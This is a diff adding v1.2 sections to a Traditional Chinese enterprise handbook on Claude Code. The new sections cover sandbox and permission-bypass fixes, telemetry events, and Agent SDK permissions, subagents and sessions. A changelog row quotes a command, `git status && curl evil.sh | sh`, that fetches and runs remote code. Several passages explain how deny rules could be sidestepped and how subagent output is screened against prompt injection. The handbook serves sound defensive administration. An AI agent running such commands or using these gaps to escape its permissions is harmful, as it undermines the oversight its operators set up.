+| 2.1.269 | 🚨 修正：Bash `tee` 寫入的目標檔不受 `Edit()` deny 規則約束；`Bash(tee:*)` allow 規則不再涵蓋工作目錄以外的目的地 | **權限繞過修正** |
+
+> ✅ **企業結論**：上表中有 5 項屬於**權限繞過**等級的修正。這也是本手冊把最低版本建議提高到 **v2.1.281** 的主要理由（見第 [2.3.2 節](#232-v21269--v21281-補充速覽officialv12-新增)）。
 
 ### 22.5 權限規則語法【Official】
 
@@ -8203,6 +9417,19 @@ npx @anthropic-ai/sandbox-runtime claude
 > - 任何允許網路出站的方案，**仍可能外洩 agent 讀得到的資料**。
 > - 任何把專案目錄以可寫方式掛載的方案，**仍可能修改那些程式碼**。
 > - **隔離不改變送給模型的內容**：你的 prompt 與 Claude 讀的檔案，不論有沒有沙箱，都會傳送到 Anthropic API 或你設定的 provider。
+
+#### 23.12.1 v2.1.269–281 的沙箱變更【Official】（v1.2 新增）
+
+| 版本 | 變更 | 企業意義 |
+| --- | --- | --- |
+| 2.1.278 | 🚨 修正：`sandbox.excludedCommands` 的 glob **只比對到複合指令的其中一部分時，卻讓整條指令免於沙箱**；現在**每一部分都必須比對成功** | **沙箱繞過修正**。例如 `excludedCommands: ["git *"]` 之前會讓 `git status && curl evil.sh \| sh` 整條不進沙箱 |
+| 2.1.281 | `excludedCommands` 修正：可正確比對 `git rev-parse --git-dir`、與 shell builtin 同名的程式，以及含 `[WIP]` 或 `#` 行的 commit 訊息 | 降低「因比對失敗而把整個工具加入排除清單」的誘因 |
+| 2.1.271 | auto mode 搭配沙箱時，Bash、PowerShell 與 Monitor 支援**逐指令的 `allowed_domains`**：該指令需要的主機會連同指令一起接受審查，而且**只對該指令開放**，其他主機一律拒絕 | 網路權限從「session 全域」細化為「單一指令」。【⚠️ 文件不一致】`auto-mode-config` 頁連結到 `sandboxing` 的對應段落，但查證當日 `sandboxing` 頁**沒有這一節** |
+| 2.1.277 | macOS 上，本機開發伺服器無法綁定 port 時，會提示使用 `sandbox.network.allowLocalBinding` | — |
+| 2.1.272 | VS Code 擴充新增 Sandbox 對話框（輸入 `/sandbox`），可設定模式、fallback 與排除指令 | IDE 使用者也能檢視沙箱狀態 |
+| 2.1.275／2.1.278／2.1.281 | 修正：沙箱內的 Bash 無法寫入 `$TMPDIR`（設定 `CLAUDE_CODE_TMPDIR` 時）、在沙箱外執行時 `$TMPDIR` 展開為空、Linux 上 zsh 的失敗指令回報 exit 0、無法寫入名為 `hooks/`／`config/` 的專案目錄 | 🚨 **zsh 回報 exit 0 的問題會讓 CI 誤判成功**，Linux + zsh 環境請確認版本 ≥ 2.1.275 |
+
+> ✅ **與 `blockReadsOutsideWorkingDirectories` 併用時**：沙箱會同時拒絕讀取家目錄與掛載磁碟的根目錄；需要 `~/.gitconfig` 之類的檔案時，請用 `sandbox.filesystem.allowRead` 逐一開放（見第 [15.7 節](#157-v12-新增的企業相關設定official)）。
 
 ### 23.13 本章實務案例
 
@@ -14325,7 +15552,75 @@ jq -r 'select(.level=="WARN") | .message' logs/order-service-2026-09-10.json \
 
 > 🎯 **「先統計，再取樣」是分析大檔案的標準做法。** 用 hook 或 prompt 規範強制它。
 
-### 41.6 本章實務案例
+### 41.6 v1.2 補齊的遙測訊號與政策驗證【Official】（v1.2 新增）
+
+v1.1 的第 41.2 節只列出最常用的 metric 與 event。本節依官方 `monitoring-usage` 頁補齊，並說明 v2.1.269–281 新增的訊號。
+
+#### 41.6.1 補充的 metric【Official】
+
+| Metric | 說明 |
+| --- | --- |
+| `claude_code.pull_request.count` | 透過 shell 指令或 MCP 工具建立 PR／MR 的次數 |
+| `claude_code.commit.count` | 透過 Claude Code 建立 git commit 的次數 |
+
+#### 41.6.2 補充的 event【Official】
+
+| Event | 何時記錄 | 企業用途 |
+| --- | --- | --- |
+| `claude_code.api_refusal` | API 回應 `stop_reason: "refusal"` 時（**不會**觸發 `api_error`） | 追蹤拒絕率；與第 [5.13 節](#513--automatic-model-fallback內容觸發的自動換模型officialv11-新增) 的自動換模型交叉分析 |
+| `claude_code.api_retries_exhausted` | API 請求重試多次後仍失敗 | gateway／proxy 穩定度監控 |
+| `claude_code.internal_error` | 攔截到未預期的內部錯誤（只記錄錯誤類別與代碼，**不含訊息與 stack trace**；第三方 Provider 上不發送） | 版本品質監控 |
+| `claude_code.plugin_installed` | plugin 安裝完成時（CLI 或 `/plugin`） | 🚨 **擴充機制稽核** |
+| `claude_code.plugin_loaded` | 每個 session 開始時，每個啟用的 plugin 記錄一次 | **全公司 plugin 盤點** |
+| `claude_code.skill_activated` | skill 被叫用時（經 Skill 工具或 `/` 指令） | skill 使用率；可與 `/skill-doctor` 比對 |
+| `claude_code.hook_registered` | 每個 session 開始時，每個已設定的 hook 記錄一次 | **全公司 hook 盤點**：找出不在基準政策中的 hook |
+| `claude_code.hook_execution_start`／`hook_execution_complete` | 每次 hook 執行 | v2.1.280 起，complete 事件包含 **hook 輸出大小**，以及被存成檔案的超大輸出數量 |
+| `claude_code.hook_plugin_metrics` | 官方 marketplace 的 plugin hook 回報指標時（第三方與自訂 hook 不會發送） | — |
+| `claude_code.at_mention` | 解析 prompt 中的 `@` 提及時 | 了解 context 的來源 |
+| `claude_code.compaction` | 對話壓縮完成時 | 長 session 成本分析（第 [5.10 節](#510-長-session-用量爆增的原因official)） |
+| `claude_code.subagent_completed` | subagent 完成並回傳結果時 | 依 subagent 類型彙總工具使用與執行時間 |
+| `claude_code.retention_sweep` | 保留期清理（依 `cleanupPeriodDays` 刪除過期 transcript）每次執行時 | **資料保留稽核證據** |
+| `claude_code.feedback_survey` | session 品質問卷顯示或被回答時 | — |
+| **`claude_code.managed_settings_resolved`** | 見 41.6.3 | 🚨 **驗證政策是否真的生效** |
+
+#### 41.6.3 `managed_settings_resolved`：用遙測證明政策生效【Official】
+
+v2.1.274 新增。記錄時機：session 開始時一次、managed settings 或 policy helper 狀態在 session 中改變時，以及 Claude Code **因政策而拒絕啟動或結束 session** 時。
+
+| 屬性 | 說明 |
+| --- | --- |
+| `managed_settings.trigger` | `startup`、`change`、`refused` |
+| `error.type`（僅 `refused`） | `helper_failed`、`policy_invalid`、`consent_rejected`（使用者拒絕安全核准對話框）、`force_refresh_failed`、`gateway_rejected`、`version_below_minimum` |
+| `managed_settings.sources` | 所有提供政策鍵的來源，依優先順序：`remote`、`plist`／`hklm`、`file`、`parent` 等 |
+| `managed_settings.source_behavior` | `managedSourcesBehavior` 的值（`first-wins` 或 `merge`） |
+| `managed_settings.helper.state` | policy helper 狀態：`ok`、`none`，或各種失敗原因（`exit_nonzero`、`timed_out`、`schema_rejected` 等） |
+| `managed_settings.resolved_sha256`（需 opt-in） | 遮蔽前的政策 SHA-256。**digest 相同的機器，套用的是同一份政策** |
+| `managed_settings.settings`（需 opt-in） | 政策的**鍵名與結構**，值會遮蔽（上限 8 KB） |
+
+啟用 opt-in：在 managed settings 的 `env` 中設 `OTEL_LOG_MANAGED_SETTINGS=1`。專案層與 local 設定中的值**不會生效**（避免 clone 下來的 repo 開啟它）；server-managed settings 設定此變數**不會觸發安全核准對話框**。
+
+> 🎯 **企業應用：政策漂移偵測**。在 dashboard 上依 `managed_settings.resolved_sha256` 分組：
+>
+> - 出現**多個 digest** → 有機器沒有拿到最新政策（MDM 佈署延遲或失敗）
+> - `helper.state` 不是 `ok` → policy helper 在某些機器上執行失敗
+> - `error.type = version_below_minimum` 大量出現 → 版本強制升級正在擋人，需要 IT 協助
+> - `sources` 中缺少 `remote` → server-managed settings 沒有送達
+>
+> 這是第 [8.8 節](#88-驗證政策是否生效official)「驗證政策是否生效」的**可規模化版本**：從逐台執行 `/status`，改為在遙測平台上一次看全公司。
+>
+> 📌 若使用 `otelHeadersHelper` 產生認證標頭，v2.1.275 起 helper 失敗時會在啟動時警告（`otelHeadersHelper failed; telemetry is not being exported`），避免遙測靜默中斷。
+
+#### 41.6.4 其他 v1.2 新增的屬性與變數【Official】
+
+| 項目 | 說明 | 版本 |
+| --- | --- | --- |
+| `OTEL_METRICS_INCLUDE_REPOSITORY=true` | 為 metric 與 event 加上 `vcs.repository.url.full`、`vcs.owner.name`、`vcs.repository.name`、`vcs.provider.name`，**依 repo 歸因用量**；這些屬性**只送到你自己的 exporter**，Anthropic 的遙測會丟棄所有 `vcs.*` 鍵 | v2.1.269+ |
+| `vcs.ref.head.*`（需 `OTEL_LOG_TOOL_DETAILS=1`） | Bash／PowerShell 成功執行 `git commit` 時的 commit SHA 與分支 | v2.1.269+ |
+| `claude_code.llm_request` span 的 `effort` 屬性 | 與 `api_request` event 一致，可以依 effort 分析成本 | v2.1.274+ |
+| `OTEL_LOG_TOOL_DETAILS=1` | 成本與 token metric 帶上**真實的** agent、skill、plugin 與 MCP server 名稱 | v2.1.273+ |
+| W3C `traceparent` | 直連 Anthropic API 時，每個模型請求都帶有 `claude_code.llm_request` span 的 trace context，可與伺服器端 trace 串接 | — |
+
+### 41.7 本章實務案例
 
 **案例：用 OTel 發現一個沒人注意到的問題**
 
@@ -14360,7 +15655,7 @@ jq -r 'select(.level=="WARN") | .message' logs/order-service-2026-09-10.json \
 
 🎯 **關鍵洞察：可觀測性的價值不只是抓出「違規」，更是找出「流程與實務的落差」。** 反覆被擋通常代表流程有問題，不只是人有問題。
 
-### 41.7 本章注意事項
+### 41.8 本章注意事項
 
 > 🚨 **`OTEL_LOG_USER_PROMPTS` 等變數會把原始碼與 prompt 送進你的 log 平台。** 開啟前必須完成資料分級與存取控制評估。
 >
@@ -14701,7 +15996,7 @@ Agent SDK 提供**與 Claude Code 相同的工具、agent loop 與 context 管�
 | 建立 agent 但不想自己實作 tool loop | **Agent SDK** | 在你自己的行程中執行 agent loop 的函式庫（Python / TypeScript） |
 | 互動式開發或從終端機執行單次任務 | **Claude Code CLI** | 為日常互動使用設計的終端機介面 |
 | 直接呼叫 API 並自己實作 tool loop | **Client SDK** | 直接存取 Anthropic API，你自己實作 tool loop |
-| 執行長時間或非同步 agent，且不想自己管沙箱與 session 基礎設施 | **Managed Agents** | 託管 REST API，Anthropic 執行 agent 與沙箱 |
+| 執行長時間或非同步 agent，且不想自己管沙箱與 session 基礎設施 | **Managed Agents** | 託管 REST API，Anthropic 執行 agent loop；工具在 Anthropic 管理的雲端沙箱中執行，**或在你自己基礎設施上的 self-hosted sandbox 中執行** |
 
 > 📌 **SDK 只有 Python 與 TypeScript。** 要用其他語言驅動同一個 agent loop，**把 CLI 當成子行程執行**（`-p` + `--output-format json`）。
 
@@ -14793,7 +16088,395 @@ flowchart LR
 
 > 🎯 **不要跳級。** 多數企業在階段 3–4 就能滿足需求。階段 5 需要投入平台工程能力來維護安全、隔離、稽核與成本控制。
 
-### 43.8 本章實務案例
+### 43.8 SDK 的本質：一個受監管的 CLI 子行程【Official】（v1.2 新增）
+
+> 📌 **v1.2 覆核範圍**：本節至第 43.20 節，依官方 `agent-sdk/` 系列逐頁覆核：overview、quickstart、configuration、claude-code-features、agent-loop、sessions、session-storage、permissions、user-input、hooks、subagents、custom-tools、mcp、tool-search、skills、plugins、modifying-system-prompts、structured-outputs、streaming、file-checkpointing、cost-tracking、observability、todo-tracking、hosting、secure-deployment、migration-guide、troubleshooting、typescript-v2-preview。TypeScript 與 Python 的完整 API reference 只用於查證選項名稱，不逐項轉錄。
+
+理解 SDK 的第一步，是知道它**不是**一個無狀態的 API 包裝：
+
+- 呼叫 `query()` 時，SDK 會 **spawn 一個 `claude` CLI 子行程**，透過 stdio 溝通。
+- 這個子行程擁有自己的 shell、工作目錄，以及寫在本機磁碟上的 JSONL transcript。
+- **一個 session 對應一個子行程**：N 個同時進行的 session，就是 N 個子行程。
+- TypeScript 與 Python SDK 都內附**原生 Claude Code binary**，而且版本**釘在 SDK 套件版本上**。換句話說，**升級 SDK 就是升級 CLI**。
+
+| 執行環境需求 | 值 |
+| --- | --- |
+| Python SDK | Python 3.10+ |
+| TypeScript SDK | Node.js 18+ |
+| 套件名稱 | `claude-agent-sdk`（Python）、`@anthropic-ai/claude-agent-sdk`（TS） |
+| 版本策略 | 遵循 semver：patch 版持續更新；升級 minor 版之前先讀 changelog |
+
+> 🎯 **企業意義**：因為 SDK 的 CLI 版本跟著套件走，**第 [8.6 節](#86-版本控管與強制升級official) 的 `requiredMinimumVersion` 同樣會作用在 SDK 應用上**（managed settings 仍會被讀取，見 43.9）。提高 managed settings 的版本下限之前，請先確認所有 SDK 應用的套件版本都已跟上，否則服務會在啟動時被拒絕。
+
+### 43.9 設定來源：`settingSources` 與「關不掉的輸入」【Official】（v1.2 新增）
+
+不傳 `settingSources` 時，`query()` 會讀取**與 CLI 完全相同**的檔案系統設定（等同 `["user", "project", "local"]`）：
+
+| 來源 | 載入內容 | 位置 |
+| --- | --- | --- |
+| `"project"` | 專案 `settings.json` 與 hooks；專案 CLAUDE.md 與 `.claude/rules/`；專案 skills、commands、subagents | `<cwd>/.claude/`（settings 與 hooks **不會往上層目錄找**）；CLAUDE.md 與 rules 會往上層找 |
+| `"user"` | 使用者 `settings.json`、`~/.claude/CLAUDE.md`、rules、skills、commands、subagents | `~/.claude/` |
+| `"local"` | `CLAUDE.local.md`、`.claude/settings.local.json` | `<cwd>` 與上層目錄 |
+
+傳入 `settingSources: []` 可以關閉上述三者，**但以下輸入不受此選項控制**：
+
+| 仍會被讀取的輸入 | 如何關閉 |
+| --- | --- |
+| **Managed policy**（MDM、登錄檔、managed settings 檔），以及以組織憑證認證時的 **server-managed settings** | 端點政策只能從主機上移除；server-managed settings **無法從 SDK 關閉** |
+| `~/.claude.json` 全域設定 | 以 `CLAUDE_CONFIG_DIR` 改到其他目錄 |
+| **Auto memory**（`~/.claude/projects/<project>/memory/`） | `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1` 或 `autoMemoryEnabled: false` |
+| claude.ai MCP connectors（以 claude.ai 登入時） | `strictMcpConfig: true`、`disableClaudeAiConnectors: true`，或 `ENABLE_CLAUDEAI_MCP_SERVERS=false`；⚠️ 傳 `mcpServers: {}` **無法**關閉 |
+| `~/.claude/settings.json` 中的 `sandbox.credentials` deny 與 mask 項目 | 從該檔案中移除 |
+
+> 🚨 **官方警告：不要依賴預設的 `query()` 選項做多租戶隔離。** 上表的輸入不論 `settingSources` 設什麼都會被讀取，SDK 行程可能因此吃到主機層的設定與其他目錄的記憶。完整做法見第 [43.18.4 節](#43184-多租戶隔離的五項措施official)。
+>
+> 📌 **Python SDK 0.1.59 以前**，`setting_sources=[]` 會被當成「未設定」（也就是全部載入）。依賴它做隔離之前，請先升級。
+
+其他設定重點：
+
+| 項目 | 行為 |
+| --- | --- |
+| `settings` 選項 | 可傳設定檔路徑或 inline JSON（TS 也可傳物件），**優先權高於 user／project／local**，只低於 managed |
+| `env` 選項 | 🚨 **TypeScript 會「取代」子行程環境**（要保留 `PATH`、`ANTHROPIC_API_KEY`，必須展開 `...process.env`）；**Python 則是「合併」到繼承的環境** |
+| `cwd` | 決定載入哪個專案的設定、skills 與 session 歸屬；**沒有 setter**，要換目錄只能開新 session |
+| `additionalDirectories` / `add_dirs` | 授予**檔案存取**，但**不是設定來源**（該目錄的 `.claude/settings.json` 不會生效） |
+| `temperature`、`top_p`、`max_tokens` | **沒有對應選項**；請改用 effort 或花費上限，真的需要時直接呼叫 Messages API |
+| 執行中切換 | streaming 模式下可用 `setModel()`、`setPermissionMode()`；TS 另有 `applyFlagSettings()` 與 `updateSettings()` |
+
+### 43.10 權限：評估順序與六種模式【Official】（v1.2 新增）
+
+SDK 的工具權限依下列順序評估，**先命中者決定結果**：
+
+```mermaid
+flowchart TD
+    A["工具呼叫"] --> H["1. Hooks<br/>可直接 deny；hook 的 allow 不會跳過 2、3"]
+    H --> D["2. deny 規則<br/>disallowedTools + settings.json<br/>bypass 模式下也有效"]
+    D --> K["3. ask 規則<br/>轉交 canUseTool（bypass 下也是）"]
+    K --> M["4. 權限模式<br/>bypass / acceptEdits / plan"]
+    M --> AL["5. allow 規則<br/>allowedTools + settings.json"]
+    AL --> CB["6. canUseTool callback<br/>dontAsk 模式下直接拒絕"]
+```
+
+五個最容易誤解的地方：
+
+| # | 誤解 | 事實 |
+| --- | --- | --- |
+| 1 | 「`allowedTools` 是白名單」 | ❌ 它只是**預先核准**；沒列出的工具仍然存在，會落到權限模式與 callback 決定 |
+| 2 | 「`allowedTools: ["Read"]` 加上 `bypassPermissions`，就只會放行 Read」 | 🚨 **會放行所有工具**，包括 Bash、Write、Edit。要在 bypass 下封鎖工具，必須用 `disallowedTools` |
+| 3 | 「權限檢查寫在 `canUseTool` 裡就安全」 | 🚨 **被自動核准的呼叫永遠不會到達 `canUseTool`**（bare-name 的 `allowedTools`、`acceptEdits`、bypass）。每次都必須執行的檢查，請寫成 `PreToolUse` hook |
+| 4 | 「`disallowedTools: ["Bash(rm *)"]` 能擋住所有刪除」 | 只比對**字面寫法**；`/bin/rm` 不會被比對到，會落到權限模式 |
+| 5 | 「`Edit(/secrets/**)` 會保護磁碟上的 `/secrets`」 | 單斜線是**相對於規則來源**（在 SDK 中是工作目錄）；絕對路徑要寫成 `Edit(//secrets/**)` |
+
+鎖定型 agent 的標準寫法（無人值守、工具面固定）：
+
+```typescript
+const options = {
+  allowedTools: ["Read", "Glob", "Grep"],
+  permissionMode: "dontAsk" // 任何會跳出提示的呼叫都直接拒絕
+};
+```
+
+| 模式 | SDK 行為 |
+| --- | --- |
+| `default` | 需要核准、又沒命中 allow 規則者，交給 `canUseTool`；**沒有 callback 就拒絕** |
+| `dontAsk` | 從不提示；會提示的一律拒絕，`canUseTool` 永遠不會被呼叫 |
+| `acceptEdits` | 自動核准工作目錄內的檔案編輯，以及 `mkdir`／`touch`／`rm`／`rmdir`／`mv`／`cp`／`sed` |
+| `plan` | 不自動核准任何編輯；會修改檔案的 shell 指令也會送到 callback（v2.1.212+） |
+| `auto` | 由分類器決定 |
+| `bypassPermissions` | 自動核准；**TS 需要另外設 `allowDangerouslySkipPermissions: true`**；在 Unix 上以 root 執行時會拒絕啟動 |
+
+> ⚠️ **Subagent 權限模式的繼承**：subagent 預設沿用父 session 的模式。只有父 session 為 `default`、`dontAsk` 或 `plan` 時，`AgentDefinition.permissionMode` 才會生效，而且**永遠不會套用 `bypassPermissions`**（v2.1.267+）。反過來說：**父 session 是 bypass，所有 subagent 就都是 bypass**。
+>
+> 📌 若設了 `canUseTool`，卻又用了會讓它被跳過的組態，TS SDK 會發出程序警告 `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED`。建議在服務啟動時監聽這個警告，並把它當成部署錯誤處理。
+
+### 43.11 Agent Loop 的控制：回合、預算、effort 與結果【Official】（v1.2 新增）
+
+| 選項 | 控制 | 預設 | 達到上限時 |
+| --- | --- | --- | --- |
+| `maxTurns` / `max_turns` | 工具往返次數 | 無上限（設 `0` 也是無上限） | 結果為 `error_max_turns` |
+| `maxBudgetUsd` / `max_budget_usd` | 花費上限（**含 subagent**） | 無上限（設 `0` 會被 CLI 拒絕） | 拒絕再 spawn subagent（`Budget limit reached`）、停止背景 subagent、結果為 `error_max_budget_usd` |
+| `effort` | 推理深度（`low` 到 `max`） | 依第 [5.4 節](#54-effort-level推理投入程度official) 解析 | — |
+| `fallbackModel` | 主模型過載時的備援（可用逗號串接多個） | 無 | 每個使用者回合開始時會重試主模型 |
+
+結果的 `subtype`（**務必先檢查它，再讀 `result`**）：
+
+| subtype | 意義 |
+| --- | --- |
+| `success` | 正常完成；只有這種結果會帶 `result` 文字 |
+| `error_max_turns`／`error_max_budget_usd` | 碰到上限 |
+| `error_during_execution` | 執行中斷；session crash 時成本欄位可能歸零、`stop_reason` 為 `null` |
+| `error_max_structured_output_retries` | 在重試上限內沒能產生合格的結構化輸出 |
+
+- `stop_reason === "refusal"` 代表模型拒絕。這與第 [5.13 節](#513--automatic-model-fallback內容觸發的自動換模型officialv11-新增) 的自動換模型有關：**SDK 與 `-p` 模式遇到被標記的請求時，會直接以拒絕結束**。
+- 單次 `query()` 碰到錯誤結果時，會先吐出結果訊息，**再丟出例外**。這是刻意的設計，請用 try 包起來。
+- `usage` 只涵蓋主迴圈；**整棵 agent 樹的用量要看 `modelUsage`**。
+
+> 🚨 **官方明言：SDK 沒有頂層的 session 逾時**，也沒有單一 subagent 的總執行時限。無人值守的服務**必須**自行設定 `maxTurns` 與 `maxBudgetUsd`。`CLAUDE_ASYNC_AGENT_STALL_TIMEOUT_MS` 只是「subagent 停止輸出」時觸發的看門狗，不是總時限。
+
+Context 管理要點：接近上限時會自動壓縮，串流中會出現 `compact_boundary` 系統訊息。**早期 prompt 中的指示可能在壓縮後遺失**，因此長期規則請放在 CLAUDE.md（每次請求都會重新注入），也可以在 CLAUDE.md 中加一段「壓縮時務必保留……」的指示。
+
+### 43.12 System Prompt 策略【Official】（v1.2 新增）
+
+> 🚨 **最常見的遷移陷阱**：不設 `systemPrompt` 時，SDK 用的是**最小預設 prompt**，只支援工具呼叫，**不包含 Claude Code preset 中的安全與防護指示**，也沒有工作目錄與環境的脈絡。這一點與 `claude -p` **不同**（`-p` 預設使用 Claude Code 的 system prompt）。
+
+| 你在建置 | 建議做法 | 取得的內容 |
+| --- | --- | --- |
+| 有人監看與引導的 CLI／IDE 類 coding 工具 | `{ type: "preset", preset: "claude_code" }` | Claude Code 完整 prompt（含安全規則） |
+| 同上，但要加入公司規範或輸出格式 | preset 加 `append` | 以上全部，再加上你的指示；**風險最低** |
+| 介面、身分或權限模型不同的 agent，或非 coding agent | 自訂字串 | 只有你寫的內容；**工具說明與安全指示必須自己補上** |
+| 只要工具呼叫、沒有 persona 的精簡迴圈 | 不設 `systemPrompt` | 最小預設 |
+
+| 特性 | CLAUDE.md | Output Styles | preset + `append` | 自訂 `systemPrompt` |
+| --- | --- | --- | --- | --- |
+| 持久化 | 專案檔案 | 檔案 | 僅限 session | 僅限 session |
+| 預設工具 | 保留 | 保留 | 保留 | **遺失（除非自行加入）** |
+| 內建安全 | 保留 | 保留 | 保留 | **必須自行加入** |
+| 環境脈絡 | 自動 | 自動 | 自動 | 必須自行提供 |
+
+✅ **企業建議**：無人值守的 coding 自動化（例如在 CI 中修 lint、審 diff）**仍然適用 `claude_code` preset**。只有對外提供給終端使用者的非 coding agent 才寫自訂 prompt，而且要把安全指示與 prompt injection 防護寫進去。
+
+### 43.13 Subagent：定義、繼承與成本上限【Official】（v1.2 新增）
+
+`AgentDefinition` 的主要欄位：
+
+| 欄位 | 說明 |
+| --- | --- |
+| `description`、`prompt` | **必填**：何時使用、system prompt |
+| `tools` / `disallowedTools` | 允許／移除的工具；`disallowedTools` 可用 `mcp__server__*`、`mcp__*` |
+| `model` | `fable`、`opus`、`sonnet`、`haiku`、`inherit`，或完整 model ID |
+| `skills` | 啟動時預先載入的 skills |
+| `mcpServers` | 此 agent 可用的 MCP server |
+| `maxTurns` | 回合上限（達到時輸出會標記為 partial，之後可以 resume） |
+| `background` | 強制在背景執行（**subagent 預設就在背景執行**） |
+| `effort` | 覆寫 session 的 effort |
+| `permissionMode` | 見 43.10 的繼承規則 |
+| `omitClaudeMd` | 作為 subagent 時不載入 user／project／local 的 CLAUDE.md（managed 仍會載入）；**僅 TS SDK v0.3.271+** |
+
+以程式碼定義的 agent **優先於** `.claude/agents/` 中同名的檔案型 agent。設定 `CLAUDE_AGENT_SDK_DISABLE_BUILTIN_AGENTS=1` 可以移除內建的 `general-purpose` subagent。
+
+**Subagent 看得到什麼**：自己的 system prompt、Agent 工具傳入的 prompt、專案 CLAUDE.md（除非設了 `omitClaudeMd`）、工具定義。**看不到**：父對話的歷史、父層的 system prompt、沒有列在 `skills` 中的 skill 內容。父層只會收到 subagent 的最後一則訊息。
+
+> 🛡️ **Prompt injection 防護（v2.1.210+／v2.1.277+）**：subagent 的最終訊息交給父層之前會先被掃描。只有 harness 才會送出的控制標籤（例如 `<system-reminder>`）會被中和；以 `Human:`／`Assistant:` 開頭的行會被跳脫；提到權限設定的字眼會保留，但會加上 `[harness: ...]` 標記。v2.1.277 起，subagent 的結果會以「subagent 輸出」標頭包裝並縮排，**無法偽裝成 session 本身的指示**。
+
+**控制 agent 樹的成長**（一個 prompt 可能長成一整棵 agent 樹）：
+
+| 限制 | 設定方式 | 預設 | 達到時 |
+| --- | --- | --- | --- |
+| 深度 | `CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH` | 主 agent 之下 **3 層**（設 `1` 表示 subagent 不能再 spawn） | 最底層的 subagent 自己完成工作 |
+| 並行數 | `CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS` | **20** | 回傳 `Concurrent subagent limit reached`（ultracode 下不受此限制） |
+| 花費 | `maxBudgetUsd` | 無上限 | 見 43.11 |
+
+> ⚠️ **Opus 5 之後的模型更傾向委派 subagent**。使用 `claude_code` preset 時，Claude Code 會在 Opus 5 的 system prompt 中加一行「除非被要求，否則不要呼叫 Agent 工具」；**使用自訂 prompt 時就沒有這一行**，請自行加入官方 prompting guide 的委派指示，**並且一定要設定上表的限制**。
+
+### 43.14 Sessions 與 SessionStore：跨主機續接【Official】（v1.2 新增）
+
+| 操作 | 說明 |
+| --- | --- |
+| Continue | 接續最近一個 session |
+| Resume | 以 session ID 續接（ID 取自 `ResultMessage.session_id`） |
+| Fork | 從既有 session 分岔，不修改原 session |
+
+預設情況下，transcript 寫在容器本機（`~/.claude/projects/` 或 `$CLAUDE_CONFIG_DIR/projects/`），**容器重啟、縮容或換節點時都會遺失**。要跨主機續接，必須實作 **`SessionStore` adapter**。官方提供物件儲存、key-value store、資料庫三種參考實作，以及一套一致性測試。
+
+| 行為 | 企業須知 |
+| --- | --- |
+| **雙寫架構** | 子行程**一定先寫本機**，SDK 再把同一批內容轉送到 store。新 session 的本機 transcript 會留下；**從 store 續接的執行結束後，本機副本會被刪除**，此時 store 是唯一的持久副本 |
+| **Mirror 寫入是 best-effort** | 失敗時最多重試 3 次；仍失敗就**丟棄該批次**、發出 `mirror_error` 系統訊息，然後繼續執行。🚨 **重視持久性的服務必須對 `mirror_error` 設告警**，而且 `append()` 要依 `entry.uuid` 去重 |
+| **只鏡像 transcript** | CLAUDE.md、記憶檔與工作目錄中的產物**不會**被鏡像，需要另外用共享 volume 或物件儲存同步 |
+| **保留期** | 🚨 **SDK 永遠不會從你的 store 刪除資料**。保留期完全由 adapter 負責，請依法遵要求設定生命週期規則 |
+| 不相容的組合 | `persistSession: false`（TS）與 file checkpointing **都不能**與 store 一起使用，SDK 會在啟動時丟出錯誤 |
+| Python 的限制 | 從 store 續接時，Python SDK 只複製憑證與 `.claude.json`；**使用者 `settings.json` 中的 `apiKeyHelper` 會失效**（出現 `Not logged in`），請改用環境變數，或寫在 managed／project 設定中 |
+
+### 43.15 SDK Hooks：Python 與 TypeScript 的支援差異【Official】（v1.2 新增）
+
+SDK 的 hook 有兩種，會**同時執行**：檔案系統 hook（寫在 `settings.json`，經 `settingSources` 載入），以及程式化 hook（傳給 `query()` 的 callback，在你的應用程序中執行，**不佔用 context**）。
+
+🚨 **Python SDK 支援的事件遠少於 TypeScript**：
+
+| 兩者都支援 | 僅 TypeScript |
+| --- | --- |
+| `PreToolUse`、`PostToolUse`、`PostToolUseFailure`、`UserPromptSubmit`、`Stop`、`SubagentStart`、`SubagentStop`、`PreCompact`、`PermissionRequest`、`Notification` | `PostToolBatch`、`UserPromptExpansion`、`MessageDisplay`、`StopFailure`、`PostCompact`、`PreModelSwitch`、`PostModelSwitch`、`PermissionDenied`、**`SessionStart`／`SessionEnd`**、`Setup`、`TeammateIdle`、`TaskCreated`、`TaskCompleted`、`Elicitation`、`ElicitationResult`、**`ConfigChange`**、**`InstructionsLoaded`**、`WorktreeCreate`／`WorktreeRemove`、`CwdChanged`、`FileChanged`、`DirectoryAdded` |
+
+> 🎯 **選型影響**：若企業平台需要以 `SessionStart`／`SessionEnd` 做稽核、以 `ConfigChange` 阻擋設定變更，或以 `InstructionsLoaded` 記錄載入了哪些指示檔，**請選 TypeScript SDK**；或者把這些 hook 寫成檔案系統 hook（`settings.json`），交給 CLI 子行程執行。
+
+### 43.16 MCP 與自訂工具【Official】（v1.2 新增）
+
+| 主題 | 重點 |
+| --- | --- |
+| **SDK MCP server**（in-process） | 直接在應用程式碼中定義工具，不需要另起 server 行程；**只有 SDK 宿主程式能註冊**，寫在 `.mcp.json` 的 `"type": "sdk"` 會被略過（v2.1.274+） |
+| **第一回合的等待** | stdio server，或沒有快取工具清單的 HTTP／SSE server，會延遲第一回合，最多等到 `MCP_TIMEOUT`（預設 30 秒）；可用 `CLAUDE_CODE_MCP_STARTUP_WAIT_MS` 統一設定（`0` 表示不等） |
+| **Tool search** | 預設延後載入 MCP 工具 schema；關閉或回退時，每個 server 的所有 schema 都會出現在每一次請求中 |
+| **工具命名** | `mcp__<server>__<tool>`；`allowedTools` 的萬用字元只能放在 `mcp__<server>__` 之後（`mcp__*` 會被忽略並發出警告） |
+| **自訂工具的錯誤處理** | 把錯誤當成工具結果回傳，讓 Claude 自行調整；不要丟出未處理的例外 |
+| **claude.ai connectors** | 以 claude.ai 登入時會自動載入，關閉方式見 43.9 |
+
+### 43.17 可觀測性與成本追蹤【Official】（v1.2 新增）
+
+**遙測**：SDK 本身不產生遙測，而是把設定傳給 CLI 子行程，由 CLI 直接匯出到你的 collector。
+
+| 訊號 | 啟用方式 |
+| --- | --- |
+| Metrics | `OTEL_METRICS_EXPORTER` |
+| Log events | `OTEL_LOGS_EXPORTER` |
+| Traces（beta） | `OTEL_TRACES_EXPORTER` 加上 `CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1` |
+
